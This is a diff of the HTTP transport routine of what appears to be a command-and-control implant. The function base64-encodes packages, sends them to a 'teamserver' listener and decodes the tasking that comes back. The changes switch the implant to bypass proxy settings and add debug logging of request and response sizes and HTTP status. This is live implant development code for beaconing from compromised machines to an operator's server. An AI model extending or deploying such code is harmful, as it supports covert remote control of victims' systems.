@@ -63,7 +63,7 @@ BOOL HttpSend(
         } else {
             // Autodetect proxy settings
             /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance->Config.Transport.UserAgent ) */
-            Instance->hHttpSession = Instance->Win32.WinHttpOpen( Instance->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
+            Instance->hHttpSession = Instance->Win32.WinHttpOpen( Instance->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
         }
 
         if ( ! Instance->hHttpSession ) {
@@ -250,11 +250,15 @@ BOOL HttpSend(
      * The teamserver base64-decodes it before parsing. See TrafficImprovements.md §2. */
     Base64Encode( (PUCHAR) Send->Buffer, Send->Length, &EncodedBuf, &EncodedSize );
 
+    PRINTF( "TransportSend: WinHttpSendRequest body=%lu bytes (encoded)\n", (unsigned long) EncodedSize )
+
     /* Send package to our listener */
     if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, EncodedBuf, (DWORD) EncodedSize, (DWORD) EncodedSize, 0 ) ) {
         if ( Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
             /* Is the server recognizing us ? are we good ?  */
-            if ( HttpQueryStatus( Request ) != HTTP_STATUS_OK ) {
+            DWORD _statusCode = HttpQueryStatus( Request );
+            PRINTF( "TransportSend: HTTP status=%lu\n", (unsigned long) _statusCode )
+            if ( _statusCode != HTTP_STATUS_OK ) {
                 PUTS_DONT_SEND( "HttpQueryStatus Failed: Is not HTTP_STATUS_OK (200)" )
                 Successful = FALSE;
                 goto LEAVE;
@@ -284,6 +288,8 @@ BOOL HttpSend(
                     MemSet( Buffer, 0, sizeof( Buffer ) );
                 } while ( Successful == TRUE );
 
+                PRINTF( "TransportSend: response body=%lu bytes (base64)\n", (unsigned long) RespSize )
+
                 /* [HVC-002 2026-03-26] Decode the base64-encoded response from the
                  * teamserver before handing it to the packet parser. */
                 {
@@ -296,6 +302,7 @@ BOOL HttpSend(
 
                     Resp->Length = (UINT32) DecodedSize;
                     Resp->Buffer = DecodedBuf;
+                    PRINTF( "TransportSend: response decoded=%lu bytes\n", (unsigned long) DecodedSize )
                 }
 
                 Successful = TRUE;
@@ -307,6 +314,8 @@ BOOL HttpSend(
         }
 
         PRINTF_DONT_SEND( "HTTP Error: %d\n", NtGetLastError() )
+        PRINTF( "TransportSend: WinHttpSendRequest FAILED LastError=%lu\n",
+                (unsigned long) NtGetLastError() )
     }
 
 LEAVE:
